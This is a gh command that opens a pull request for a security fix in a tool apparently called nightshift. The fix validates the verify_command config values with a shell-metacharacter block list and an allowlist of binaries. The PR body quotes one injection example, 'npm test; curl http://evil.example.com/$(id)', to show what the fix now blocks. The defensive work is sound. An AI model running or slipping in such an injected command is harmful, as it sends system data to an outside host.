### Create pull request
```bash
$ gh pr create --title "Security: validate verify_command before shell execution (#0208)" --body "$(cat <<'EOF'
## Summary

- Adds `validate_verify_command()` in `nightshift/core/shell.py` that blocks shell metacharacter injection in `verify_command` values read from `.nightshift.json`
- Validation runs at config-load time in `_build_config()` before any command reaches `bash -lc`, catching attacks immediately
- Adds a belt-and-suspenders runtime assertion for commands inferred by nightshift itself via `_validated_inferred_command()`
- Exports `VERIFY_COMMAND_ALLOWLIST_PREFIXES` (new constant in `core/constants.py`) and `validate_verify_command` via `nightshift/__init__.py`

## Security fix

Closes CONFIRMED-1 from pentest report #0109. The vulnerability: `verify_command` from `.nightshift.json` was passed verbatim to `["bash", "-lc", command]` with no sanitisation, allowing an attacker controlling a target repo's config to inject arbitrary shell commands.

The fix rejects two classes of malicious input:
1. **Shell metacharacters** (`; | & | | ` ` $ `) in any command -- no exceptions
2. **Unknown binary prefixes** -- only `npm`, `pnpm`, `yarn`, `bun`, `python3`, `cargo`, `go`, `make`, `bash nightshift/scripts/`, `sh nightshift/scripts/` are permitted

Example of what is now blocked: `npm test; curl http://evil.example.com/$(id)`

## Test plan

- [ ] `make check` passes (ruff, mypy, pytest, dry-runs, ASCII, install.sh refs)
- [ ] 26 new tests in `TestValidateVerifyCommand`: safe commands accepted, injection attempts rejected, inferred commands pass belt-and-suspenders check, allowlist constant is exported
- [ ] All 914 tests pass (up from 888 before this PR)
EOF
)"
```
